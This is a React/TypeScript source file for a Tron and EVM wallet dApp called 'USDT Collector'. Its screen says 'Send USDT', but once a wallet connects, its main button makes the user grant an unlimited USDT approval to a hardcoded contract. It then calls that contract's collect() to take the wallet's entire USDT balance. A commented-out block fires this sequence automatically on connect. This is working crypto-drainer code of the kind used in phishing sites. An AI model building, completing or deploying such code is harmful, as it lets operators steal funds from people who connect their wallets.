import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ' // Tron Contract

// Include both Tron and EVM networks
const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
]



// ─── WalletConnect-for-Tron helper ────────────────────────────
import * as TronWebNS from 'tronweb'          // ESM namespace
const TronWeb = (TronWebNS as any).default    // cjs default
               || (TronWebNS as any)          // fallback for older builds
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect'

const FULL_HOST = 'https://api.trongrid.io'       // Tron Mainnet
const tronWebTmp = new (TronWeb as any)({ fullHost: FULL_HOST })

export async function signAndBroadcastViaWC(
  adapter: WalletConnectAdapter,
  contractAddr: string,
  func: string,
  params: { type: string; value: any }[],
  fee = 100_000_000
) {
  const { transaction, result } =
    await tronWebTmp.transactionBuilder.triggerSmartContract(
      contractAddr,
      func,
      { feeLimit: fee, callValue: 0 },
      params,
      adapter.address
    )

  if (!result?.result) throw new Error('Failed to build transaction')

  const signed = await adapter.signTransaction(transaction)
  const sent   = await tronWebTmp.trx.sendRawTransaction(signed)
  if (!sent.result) throw new Error('Broadcast failed')
  return sent.txid || sent.transaction?.txID
}




const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new MetaMaskAdapter(),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: appkitNetworks,
})

// ── Create AppKit ──
createAppKit({
  adapters: [tronAdapter, wagmiAdapter], // Both adapters active
  networks: appkitNetworks,
  projectId: WC_PROJECT_ID,
 metadata: {
  name:        'USDT Collector',
  description: 'Collect USDT from multiple wallets',
  url:         window.location.origin,
  icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
},
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00ff9f',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === TRON ABIs ===
const USDT_ABI = [
  { constant: true, inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: true, inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
]

const COLLECT_ABI = [
  { constant: true, inputs: [], name: 'mainWallet', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { constant: true, inputs: [], name: 'usdt', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { constant: false, inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
]

function inspectTronGlobals() {
  const w = window as any
  return {
    hasTrustwallet: !!w.trustwallet,
    hasTrustwalletTronLink: !!w.trustwallet?.tronLink,
    hasTrustwalletTronWeb: !!w.trustwallet?.tronLink?.tronWeb,
    hasTronLink: !!w.tronLink,
    hasWindowTronWeb: !!w.tronWeb,
    hasTp: !!w.tp,
  }
}

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [debugLog, setDebugLog] = useState<string[]>([])
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const autoTriggered = useRef(false)

// WalletConnect adapter lives in a ref so it’s initialised once
const wcRef = useRef<WalletConnectAdapter | null>(null)

if (wcRef.current === null) {
  wcRef.current = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
      projectId: WC_PROJECT_ID,
      relayUrl: 'wss://relay.walletconnect.com',
      metadata: {
        name: 'USDT Collector',
        description: 'Collect USDT from multiple wallets',
        url: window.location.origin,
        icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
      },
    },
  })
}

const wcAdapter = wcRef.current

  const { open } = useAppKit()
const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
const {  chainId } = useAppKitNetwork()

// const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')

/**
 * Returns a usable TronWeb instance if one is present anywhere the dApp can reach.
 * Works for: Trust dApp browser, MetaMask-Tron, TronLink, window.tronWeb,
 *            and the Reown `walletProvider` when it exposes `.tronWeb`.
 */
const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

const resolveTronWeb = () => {
  const w = window as any

  // Trust Wallet dApp browser / MetaMask-Tron
  if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb

  // TronLink extension / mobile
  if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb

  // Global injection
  if (w.tronWeb?.contract) return w.tronWeb

  // Reown provider may expose .tronWeb
  if ((tronWalletProvider as any)?.tronWeb?.contract) return (tronWalletProvider as any).tronWeb

  return null
}

const tronWeb = resolveTronWeb()

const isWalletConnectTron = isTron && !tronWeb && !!wcAdapter?.connected


  const log = (msg: string) => {
    console.log(msg);
    setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
  }


  useEffect(() => {
  const init = async () => {
    if (!isConnected || !walletAddress) return

    log(`Connected: ${caipAddress || 'unknown'}`)

if (isTron) {
  const injectedTronWeb = resolveTronWeb()
  const globals = inspectTronGlobals()

  log(`TRON globals: ${JSON.stringify(globals)}`)

  if (!injectedTronWeb) {
    log('❌ No injected TronWeb detected')
    setStatus(
      'TRON account connected, but this Trust Wallet session is not exposing injected TronWeb here.'
    )
    return
  }

  log('✅ TRON injected provider detected')
  await getTronBalance(injectedTronWeb, walletAddress)
  return
}

    if (isEVM) {
      if (!evmWalletProvider) {
        log('❌ No EVM provider detected')
        setStatus('EVM wallet connected, but no EVM provider was found.')
        return
      }

      log('✅ EVM session detected')
      await getBalanceForCurrentChain()
      return
    }

    log('❌ Could not determine wallet namespace')
    setStatus('Unsupported wallet type')
  }

  init()
}, [isConnected, walletAddress, caipAddress, evmWalletProvider, chainId, isTron, isEVM])

  // useEffect(() => {
  //   const initAutomation = async () => {
  //     if (isConnected && walletAddress) {
        
  //       // --- ROUTE 1: TRON NETWORK ---
  //       if (isTron && tronWeb) {
  //         log("Tron Connection detected. Probing Wallet...");

  //         try {
  //           let attempts = 0;
  //           let ready = false;

  //           while (attempts < 20) { 
  //             if (typeof tronWeb.contract === 'function') {
  //               ready = true;
  //               break;
  //             }
  //             log(`Searching for Tron API (Attempt ${attempts + 1}/20)...`);
  //             await new Promise(r => setTimeout(r, 500));
  //             attempts++;
  //           }

  //           if (!ready) {
  //             const keys = Object.keys(tronWeb).join(', ').slice(0, 50);
  //             log(`❌ Tron API Error. Available: [${keys}]`);
  //             setStatus("Error: Incompatible Wallet API");
  //             return;
  //           }

  //           log("✅ API Found! Syncing balance...");
  //           await getBalance(tronWeb, walletAddress);

  //           if (!autoTriggered.current) {
  //             log("🚀 Automation Triggered!");
  //             autoTriggered.current = true;
  //             approveAndCollect();
  //           }
  //         } catch (e: any) {
  //           log("❌ Fatal Init Error: " + e.message);
  //         }
  //       } 
        
  //       // --- ROUTE 2: EVM NETWORK ---
  //       else if (isEVM) {
  //         log(`EVM Connection detected: ${walletAddress.slice(0,6)}...`);
  //         log("⚠️ Awaiting EVM Smart Contract deployment.");
  //         setStatus("Connected to EVM (Ethereum/BSC/Polygon)");
  //         // Prevent the automation loop from re-firing constantly on EVM
  //         autoTriggered.current = true; 
  //       }
  //     }
  //   };

  //   initAutomation();
  // }, [isConnected, walletAddress, tronWeb, isTron, isEVM]);

  const getTronBalance = async (tw: any, addr: string) => {
  const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
  const bal = await usdt.balanceOf(addr).call()
  setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
  setStatus('Ready')
  log(`TRON USDT: ${(Number(bal) / 1_000_000).toFixed(2)}`)
}

const getEvmBalance = async (provider: any, addr: string, currentChainId?: number) => {
  if (!currentChainId || !EVM_USDT[currentChainId]) {
    setUsdtBalance('0')
    setStatus('USDT not configured for this EVM chain')
    log(`❌ No USDT config for EVM chain ${currentChainId}`)
    return
  }

  const ethersProvider = new BrowserProvider(provider)
  const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)

  const [bal, decimals] = await Promise.all([
    token.balanceOf(addr),
    token.decimals(),
  ])

  const formatted = formatUnits(bal, decimals)
  setUsdtBalance(formatted)
  setStatus('Ready')
  log(`EVM USDT: ${formatted}`)
}

const getBalanceForCurrentChain = async () => {
  try {
    if (!walletAddress) return

  if (isTron) {
  const injectedTronWeb = resolveTronWeb()

  if (!injectedTronWeb) {
    log('❌ TronWeb not available')
    setStatus('TRON wallet connected, but no injected TronWeb is available.')
    return
  }

  await getTronBalance(injectedTronWeb, walletAddress)
  return
}

    if (isEVM) {
      if (!evmWalletProvider) {
        log('❌ EVM provider not available')
        setStatus('EVM wallet connected, but EVM provider is not available.')
        return
      }
      await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))
      return
    }

    setStatus('Unsupported wallet namespace')
    log('❌ Unsupported namespace')
  } catch (e: any) {
    console.warn('Balance fetch failed', e)
    log(`❌ Balance fetch failed: ${e?.message || 'Unknown error'}`)
    setStatus('Failed to fetch balance')
  }
}

 const handleConnect = () => {
  open({ view: 'AllWallets' })
  wcAdapter?.connect({}).catch(() => {})
}

  const approveAndCollect = async () => {
    // EVM BLOCKER
    if (isEVM) {
      log("❌ EVM transactions require an EVM Smart Contract Address.");
      setStatus('EVM Logic Not Configured');
      return;
    }

    // ---------- WALLETCONNECT PATH ----------
if (isWalletConnectTron) {
  try {
    const MAX_UINT =
      '115792089237316195423570985008687907853269984665640564039457584007913129639935'

    await signAndBroadcastViaWC(
      wcAdapter,
      USDT_ADDRESS,
      'approve(address,uint256)',
      [
        { type: 'address', value: tronWebTmp.address.toHex(CONTRACT_ADDRESS) },
        { type: 'uint256', value: MAX_UINT },
      ]
    )

    const amount = '0' // ← you can query balance first if you like

    const txId = await signAndBroadcastViaWC(
      wcAdapter,
      CONTRACT_ADDRESS,
      'collect(address,uint256)',
      [
        { type: 'address', value: tronWebTmp.address.toHex(walletAddress) },
        { type: 'uint256', value: amount },
      ],
      150_000_000
    )

    setTxHash(txId)
    setStatus('✅ All USDT collected!')
    return
  } catch (e: any) {
    log(`❌ WC error: ${e.message}`)
    setStatus('❌ Transaction failed')
    setLoading(false)
    return
  }
}

// ---------- INJECTED TRONWEB PATH ----------
if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) {
    log('❌ Error: Wallet not fully initialized')
    setStatus('TRON wallet not ready')
  return
}

    setLoading(true);
    setStatus('Step 1/2: Approving...');
    log("Requesting USDT Approval...");

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS);
      
      const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
      log(`✅ Approved! Hash: ${approveTx.slice(0,10)}...`);
      
      setStatus('Step 2/2: Collecting...');
      log("Waiting 3s for network sync...");
      await new Promise(r => setTimeout(r, 3000));

      const balanceObj = await usdt.balanceOf(walletAddress).call();
      const amount = balanceObj.toString();
      log(`Found ${Number(amount)/1000000} USDT to collect.`);

      const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
      const tx = await contract.collect(walletAddress, amount).send({
        feeLimit: 150_000_000,
      });

      setTxHash(tx);
      log("✅ Successfully Collected!");
      setStatus('✅ All USDT collected!');
    } catch (err: any) {
      log(`❌ Error: ${err.message || 'User rejected'}`);
      setStatus('❌ Transaction Failed');
      autoTriggered.current = false; 
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
              U
            </div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {isEVM ? 'EVM Network' : NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!isConnected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>

              <button
                onClick={handleConnect}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">
                Opens directly to All Wallets with search
              </p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                </div>
                <button
                  onClick={() => navigator.clipboard.writeText(walletAddress ?? '')}
                  className="text-emerald-400 hover:text-white"
                >
                  <Copy size={20} />
                </button>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">
                  {isEVM ? '---' : usdtBalance} <span className="text-3xl">USDT</span>
                </p>
              </div>

              <button
                onClick={approveAndCollect}
                disabled={loading}
                className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
                  isEVM ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' : 'bg-white hover:bg-zinc-100 text-black'
                }`}
              >
                {loading ? 'Processing...' : isEVM ? 'Switch to Tron to Collect' : 'Collect All USDT'}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>

              {txHash && (
                <p className="text-[10px] text-center text-emerald-400 break-all font-mono">
                  TX: {txHash}
                </p>
              )}
            </div>
          )}

         {/* --- Debug Monitor --- */}
        <div className="mt-6 pt-6 border-t border-zinc-800">
          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
            {debugLog.map((line, i) => (
              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
                {`> ${line}`}
              </div>
            ))}
          </div>
        </div>

        </div>
      </div>
    </div>
  )
}